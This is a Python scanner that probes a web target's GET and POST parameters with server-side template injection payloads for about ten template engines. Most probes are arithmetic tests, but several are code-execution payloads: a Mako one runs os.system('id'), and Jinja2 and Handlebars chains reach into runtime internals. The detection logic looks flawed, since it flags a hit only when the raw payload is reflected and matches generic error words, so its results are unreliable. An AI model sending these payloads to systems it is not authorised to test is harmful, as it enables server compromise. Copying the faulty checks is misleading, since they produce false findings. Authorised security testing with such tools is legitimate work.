#!/usr/bin/env python3
"""
SSTI (Server-Side Template Injection) Detector
Tests for template injection vulnerabilities
"""

import requests
import urllib.parse
import json
import time
from datetime import datetime
from bs4 import BeautifulSoup
import re

class SSTIDetector:
    """Server-Side Template Injection detector"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # SSTI payloads for various template engines
        # Format: (payload, expected_output, template_engine)
        self.payloads = [
            # Jinja2 (Python)
            ('{{7*7}}', '49', 'Jinja2'),
            ('{{7*\'7\'}}', '7777777', 'Jinja2'),
            ('{{ config }}', 'Config', 'Jinja2'),
            ('{{\'\'.__class__.__mro__[1].__subclasses__()}}', 'class', 'Jinja2'),

            # Twig (PHP)
            ('{{7*7}}', '49', 'Twig'),
            ('{{7*\'7\'}}', '49', 'Twig'),
            ('{{dump(app)}}', 'Application', 'Twig'),
            ('{{_self.env}}', 'Twig', 'Twig'),

            # Freemarker (Java)
            ('${7*7}', '49', 'Freemarker'),
            ('#{7*7}', '49', 'Freemarker'),
            ('${7*\'7\'}', 'NumberFormatException', 'Freemarker'),
            ('${\'freemarker\'.toUpperCase()}', 'FREEMARKER', 'Freemarker'),

            # Velocity (Java)
            ('#set($x=7*7)$x', '49', 'Velocity'),
            ('$7*7', '49', 'Velocity'),
            ('#set($str=\'velocity\')$str.toUpperCase()', 'VELOCITY', 'Velocity'),

            # Smarty (PHP)
            ('{$smarty.version}', '.', 'Smarty'),
            ('{php}echo 7*7;{/php}', '49', 'Smarty'),
            ('{7*7}', '49', 'Smarty'),

            # Mako (Python)
            ('<%=7*7%>', '49', 'Mako'),
            ('${7*7}', '49', 'Mako'),
            ('<%import os%>${os.system(\'id\')}', 'uid=', 'Mako'),

            # ERB (Ruby)
            ('<%=7*7%>', '49', 'ERB'),
            ('<%=\'ruby\'.upcase%>', 'RUBY', 'ERB'),

            # Handlebars (JavaScript)
            ('{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return 7*7"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}', '49', 'Handlebars'),

            # Pug/Jade (JavaScript)
            ('#{7*7}', '49', 'Pug'),

            # Generic polyglot
            ('${{<%[%\'"}}%\\', 'error', 'Generic'),
        ]

    def scan(self):
        """Run SSTI scan"""
        print(f"[*] Starting SSTI scan on {self.target_url}")

        # Test GET parameters
        self._test_get_parameters()

        # Test POST parameters
        self._test_post_parameters()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_get_parameters(self):
        """Test GET parameters for SSTI"""
        print("[*] Testing GET parameters...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            # Try common parameter names
            params = {'q': ['test'], 'search': ['test'], 'name': ['test']}

        for param_name in params.keys():
            for payload, expected, engine in self.payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                if self._test_payload(test_url, param_name, payload, expected, engine, 'GET'):
                    return  # Found vulnerability, stop testing

    def _test_post_parameters(self):
        """Test POST parameters for SSTI"""
        print("[*] Testing POST parameters...")

        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            if not forms:
                # Try common POST parameters
                common_params = ['name', 'comment', 'message', 'content', 'text']
                for param in common_params:
                    for payload, expected, engine in self.payloads[:5]:
                        data = {param: payload}
                        if self._test_post_payload(self.target_url, data, param, payload, expected, engine):
                            return

            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()

                if method != 'POST':
                    continue

                action_url = urllib.parse.urljoin(self.target_url, action) if action else self.target_url

                # Get form data
                form_data = {}
                inputs = form.find_all(['input', 'textarea'])
                for input_field in inputs:
                    name = input_field.get('name')
                    value = input_field.get('value', '')
                    if name:
                        form_data[name] = value

                # Test each field
                for field_name in form_data.keys():
                    for payload, expected, engine in self.payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload

                        if self._test_post_payload(action_url, test_data, field_name, payload, expected, engine):
                            return

        except Exception as e:
            print(f"[!] Error testing POST: {e}")

    def _test_payload(self, url, param_name, payload, expected, engine, method):
        """Test single SSTI payload"""
        try:
            response = self.session.get(url, timeout=10)

            # Check if payload is reflected
            if payload in response.text:
                # Check if expected output is present
                if expected.lower() in response.text.lower():
                    # Verify it's not just echoing the payload
                    if not self._is_simple_reflection(payload, expected, response.text):
                        vuln = {
                            'type': 'SSTI - Server-Side Template Injection',
                            'severity': 'critical',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'template_engine': engine,
                            'method': method,
                            'evidence': f'Template evaluated: {payload} resulted in {expected}',
                            'cwe': 'CWE-94'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] SSTI found: {engine} in {param_name}")
                        return True

            # Check for error messages that indicate SSTI
            error_indicators = [
                'Template', 'SyntaxError', 'TemplateSyntaxError',
                'UndefinedError', 'Jinja', 'Twig', 'Freemarker',
                'Velocity', 'Smarty', 'Mako', 'ERB'
            ]

            for indicator in error_indicators:
                if indicator in response.text:
                    vuln = {
                        'type': 'Possible SSTI',
                        'severity': 'high',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'template_engine': engine,
                        'method': method,
                        'evidence': f'Template error exposed: {indicator}',
                        'cwe': 'CWE-94'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Possible SSTI: {engine} (error exposed)")
                    return True

        except Exception as e:
            pass

        return False

    def _test_post_payload(self, url, data, field_name, payload, expected, engine):
        """Test POST SSTI payload"""
        try:
            response = self.session.post(url, data=data, timeout=10)

            if payload in response.text:
                if expected.lower() in response.text.lower():
                    if not self._is_simple_reflection(payload, expected, response.text):
                        vuln = {
                            'type': 'SSTI - Server-Side Template Injection',
                            'severity': 'critical',
                            'url': url,
                            'parameter': field_name,
                            'payload': payload,
                            'template_engine': engine,
                            'method': 'POST',
                            'evidence': f'Template evaluated via POST: {payload} → {expected}',
                            'cwe': 'CWE-94'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] SSTI found (POST): {engine}")
                        return True

        except Exception as e:
            pass

        return False

    def _is_simple_reflection(self, payload, expected, response_text):
        """Check if it's just reflecting the input without evaluation"""
        # If the payload itself appears exactly, it might be simple reflection
        # But if the expected output appears separately, it's evaluation

        # Count occurrences
        payload_count = response_text.count(payload)
        expected_count = response_text.count(expected)

        # If expected appears without the full payload nearby, it's evaluation
        if expected_count > 0 and payload_count == 0:
            return False

        # If both appear together, might be reflection
        # Do a simple distance check
        payload_pos = response_text.find(payload)
        expected_pos = response_text.find(expected)

        if payload_pos >= 0 and expected_pos >= 0:
            distance = abs(expected_pos - payload_pos)
            # If they're far apart, likely evaluation
            if distance > len(payload) + 50:
                return False

        # Additional check: if expected is numeric result of math operation
        if expected.isdigit() and expected != payload:
            return False

        return True

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 ssti_detector.py <url>")
        print("\nExample:")
        print("  python3 ssti_detector.py https://example.com/search?q=test")
        sys.exit(1)

    detector = SSTIDetector(sys.argv[1])
    results = detector.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")
